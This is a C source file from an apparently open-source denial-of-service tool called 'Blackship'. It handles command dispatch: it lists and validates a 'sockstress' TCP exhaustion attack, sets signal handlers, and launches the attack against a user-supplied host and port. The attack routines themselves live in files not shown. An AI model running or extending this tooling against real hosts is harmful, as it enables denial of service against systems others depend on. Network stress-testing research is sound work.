// Copyright [2016] [hoenir]
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//    http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <lib/net.h>
#include <lib/info.h>
#include <lib/mem.h>
#include <lib/util.h>

#include "cmds.h"
#include "sockstress.h"

static const char *attacks[] = {
	"stress	 - sockstress type attack",
};

static const char *doses[] = {
	"stress",
};


void list_attacks(void)
{
	fprintf(stdout, "\n");
	STATUS("This pirate ship suports this attacks");
	for(uint8_t i=0; i<ARRAY_SIZE(attacks); i++)
		fprintf(stdout, "%s\n", attacks[i]);
}

ATTACK_SW valid_attack(const char *exploit)
{
	uint8_t i = 0;
	for (; i < ARRAY_SIZE(doses); i++) {
		if (!strcmp(exploit, doses[i])) {
			switch (i) {
				case 0:
					return SOCKSTRESS;
			}
		}
	}
	return END_ATTACK;
}

static conn_t *conn;

static void sigint_handler (int signo)
{
	if (signo != SIGINT)
		INFOEE("could not treat any signal different from SIGINT");
	STATUS("Closing connection and freeing up the memory");	

	conn_buff_free(conn);
	conn_free(conn);
	exit(EXIT_SUCCESS);
}

void run_cmd(arguments args)
{
	if (args.list_attacks) {
		list_attacks();
		return;
	}

	if (treat_signal(SIGPIPE, SIG_IGN) == SIG_ERR)
		INFOEE("could not set signal handler for SIGPIPE");

	if (treat_signal(SIGINT, sigint_handler) == SIG_ERR)
		INFOEE("could not set the signal handler for SIGINT");

	if (!args.host) {
		WSTATUS("Please set the host with a valid ip");
		return;
	}

	if ((args.port.n == 0) && (args.port.low == 0) && (args.port.high == 0) && (!args.port.random)) {
		WSTATUS("Empty port number and port options, please set a valid one");
		return;
	}

	STATUS("Blackship start sailing..");

	conn = conn_new();

	switch (args.attack) {
	case SOCKSTRESS:
		sockstress_init(conn, args);
		sockstress_attack();
		break;
	case START_ATTACK:
	case END_ATTACK:
		WSTATUS("Please set a valid attack that the app supports");
	}

	conn_free(conn);
}
